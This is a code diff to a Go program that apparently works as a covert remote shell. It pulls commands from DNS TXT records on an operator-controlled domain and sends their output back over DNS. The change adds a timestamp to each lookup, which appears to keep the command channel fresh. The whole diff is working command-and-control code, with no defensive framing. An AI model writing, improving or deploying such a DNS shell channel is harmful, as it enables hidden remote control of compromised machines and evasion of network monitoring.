@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -64,13 +65,18 @@ type Shell struct {
 	cmdStdinWriter *io.PipeWriter
 }
 
+func (s *Shell) makeTimestamp() string {
+	timestamp := time.Now().UnixNano() / int64(time.Millisecond)
+	return strconv.FormatInt(timestamp, 16)
+}
+
 func (s *Shell) Init(domain string) {
 	s.stdIn = make(chan string)
 	s.stdOut = make(chan []byte)
 	s.cmdStdoutReader, s.cmdStdoutWriter = io.Pipe()
 	s.cmdStdinReader, s.cmdStdinWriter = io.Pipe()
 
-	s.domainCmd = "cmd." + domain
+	s.domainCmd = ".in." + domain
 	s.domainOut = "out." + domain
 }
 
@@ -78,7 +84,7 @@ func (s *Shell) Init(domain string) {
 func (s *Shell) FetchStdin(r *net.Resolver) {
 	for {
 		//get shell command using dns TXT record
-		data, err := r.LookupTXT(context.Background(), s.domainCmd)
+		data, err := r.LookupTXT(context.Background(), s.makeTimestamp()+s.domainCmd)
 		if err != nil {
 			log.Fatal(err)
 			return
